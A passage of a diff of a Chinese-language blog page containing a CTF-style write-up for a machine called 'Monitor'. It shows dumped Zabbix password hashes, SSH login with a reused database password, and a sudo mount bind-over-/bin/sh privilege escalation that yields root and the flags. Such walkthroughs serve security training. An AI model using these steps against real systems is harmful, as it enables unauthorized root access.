-|      1 | Admin    | Zabbix | Administrator | $2y$10$92nDno4n0Zm7Ej7Jfsz8WukBfgSS/U0QkIuu8WkJPihXBb2A1UrEK |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |
-|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |
+<span class="pl-k">|</span>      1 <span class="pl-k">|</span> Admin    <span class="pl-k">|</span> Zabbix <span class="pl-k">|</span> Administrator <span class="pl-k">|</span> <span class="pl-smi">$2</span>y<span class="pl-smi">$1</span>0<span class="pl-smi">$9</span>2nDno4n0Zm7Ej7Jfsz8WukBfgSS/U0QkIuu8WkJPihXBb2A1UrEK <span class="pl-k">|</span>     <span class="pl-k">|</span>         1 <span class="pl-k">|</span> 0          <span class="pl-k">|</span> default <span class="pl-k">|</span> 30s     <span class="pl-k">|</span> default <span class="pl-k">|</span>              0 <span class="pl-k">|</span>            <span class="pl-k">|</span>             0 <span class="pl-k">|</span>            50 <span class="pl-k">|</span> default  <span class="pl-k">|</span>      3 <span class="pl-k">|</span>
+<span class="pl-k">|</span>      2 <span class="pl-k">|</span> guest    <span class="pl-k">|</span>        <span class="pl-k">|</span>               <span class="pl-k">|</span> <span class="pl-smi">$2</span>y<span class="pl-smi">$1</span>0<span class="pl-smi">$8</span>9otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 <span class="pl-k">|</span>     <span class="pl-k">|</span>         0 <span class="pl-k">|</span> 15m        <span class="pl-k">|</span> default <span class="pl-k">|</span> 30s     <span class="pl-k">|</span> default <span class="pl-k">|</span>              0 <span class="pl-k">|</span>            <span class="pl-k">|</span>             0 <span class="pl-k">|</span>            50 <span class="pl-k">|</span> default  <span class="pl-k">|</span>      4 <span class="pl-k">|</span>
 +--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
-2 rows in set (0.001 sec)
+2 rows <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.001 sec)
 
-MariaDB [zabbix]&gt;
-</code></pre>
+MariaDB [zabbix]<span class="pl-k">&gt;</span></pre></div>
 <p>疑惑之际，测试<code class="notranslate">hyh</code>的密码就是数据库的密码<code class="notranslate">root123</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# ssh hyh@$IP
-#root123
-hyh@Monitor:~$ id
-uid=1000(hyh) gid=1000(hyh) groups=1000(hyh)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh hyh@$IP</span>
+<span class="pl-c"><span class="pl-c">#</span>root123</span>
+hyh@Monitor:<span class="pl-k">~</span>$ id
+uid=1000(hyh) gid=1000(hyh) groups=1000(hyh)</pre></div>
 <h3>5.获得<code class="notranslate">root</code>权限</h3>
 <p>测试<code class="notranslate">sudo -l</code>,可以<code class="notranslate">root</code>权限执行<code class="notranslate">mount</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">hyh@Monitor:~$ sudo -l
-Matching Defaults entries for hyh on Monitor:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<div class="highlight highlight-source-shell"><pre class="notranslate">hyh@Monitor:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> hyh on Monitor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User hyh may run the following commands on Monitor:
-    (ALL) NOPASSWD: /usr/bin/mount
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/mount</pre></div>
 <h5><code class="notranslate">mount</code>提权</h5>
 <p>查表，<code class="notranslate">mount</code>有现成的提权方案</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#`mount`提权
-sudo mount -o bind /bin/sh /bin/mount
-sudo mount
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>`mount`提权</span>
+sudo mount -o <span class="pl-c1">bind</span> /bin/sh /bin/mount
+sudo mount</pre></div>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">hyh@Monitor:~$ sudo /usr/bin/mount  -o bind /bin/sh /bin/mount
-/usr/bin/mount: 0: Illegal option -o bind
-hyh@Monitor:~$ sudo mount
-# id
+<div class="highlight highlight-source-shell"><pre class="notranslate">hyh@Monitor:<span class="pl-k">~</span>$ sudo /usr/bin/mount  -o <span class="pl-c1">bind</span> /bin/sh /bin/mount
+/usr/bin/mount: 0: Illegal option -o <span class="pl-c1">bind</span>
+hyh@Monitor:<span class="pl-k">~</span>$ sudo mount
+<span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=0(root) gid=0(root) groups=0(root)
-# cat /root/root.txt
+<span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
 flag{root-deb15d884e04de6f6972b3c25e3cc11b}
-# cat /home/hyh/user.txt
-flag{user-ab0e0561b1a833a6141ad2273744543c}
-</code></pre></div>
+<span class="pl-c"><span class="pl-c">#</span> cat /home/hyh/user.txt</span>
+flag{user-ab0e0561b1a833a6141ad2273744543c}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
